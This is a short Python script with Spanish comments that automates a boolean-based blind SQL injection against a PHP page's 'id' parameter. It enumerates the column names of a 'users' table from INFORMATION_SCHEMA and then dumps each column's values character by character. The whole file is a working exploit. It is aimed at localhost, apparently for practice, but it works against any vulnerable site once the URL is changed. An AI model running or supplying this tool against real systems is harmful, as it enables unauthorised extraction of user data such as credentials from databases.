import requests
import string

URL = "http://localhost/news.php"
INYECTABLE_PARAM = "id"

TRUE_TEXT = "NOTICIAS"   # texto cuando la condición es TRUE

# --------------------------------------------------

def is_true(condition):
    """
    Lanza una petición con una condición booleana
    y devuelve True / False según la respuesta
    """
    payload = condition  # <-- aquí va tu payload blind
    r = requests.get(URL, params={INYECTABLE_PARAM: payload})

    return TRUE_TEXT in r.text

# --------------------------------------------------

def get_column_names(max_columns=10, max_len=20):
    columns = []

    for col_index in range(0, max_columns):
        name = ""
        for pos in range(1, max_len + 1):
            for c in string.ascii_lowercase:
                condition = f"""
                1 AND SUBSTRING(
                (
                    SELECT COLUMN_NAME
                    FROM INFORMATION_SCHEMA.COLUMNS
                    WHERE TABLE_SCHEMA = database()
                    AND TABLE_NAME = 'users'
                    LIMIT {col_index},1
                ),
                {pos},1
                ) = '{c}'
                """
                if is_true(condition):
                    name += c
                    break
            else:
                break

        if name:
            columns.append(name)
            print(f"[+] Columna encontrada: {name}")
        else:
            break

    return columns

# --------------------------------------------------

def dump_column(column, max_rows=10, max_len=50):
    print(f"\n[+] Dump de columna: {column}")

    for row in range(0, max_rows):
        value = ""
        for pos in range(1, max_len + 1):
            for c in string.printable:
                condition = f"""
                1 AND LENGTH(
                    (SELECT {column} FROM users LIMIT {row},1)
                ) >= {pos}
                AND SUBSTRING(
                    (SELECT {column} FROM users LIMIT {row},1),
                    {pos},1
                ) = '{c}'
                """
                
                if is_true(condition):
                    value += c
                    break
            else:
                break

        if value:
            print(f"  - {value}")
        else:
            break

# --------------------------------------------------

if __name__ == "__main__":
    print("[*] Enumerando columnas de users...\n")
    cols = get_column_names()

    for col in cols:
        dump_column(col)
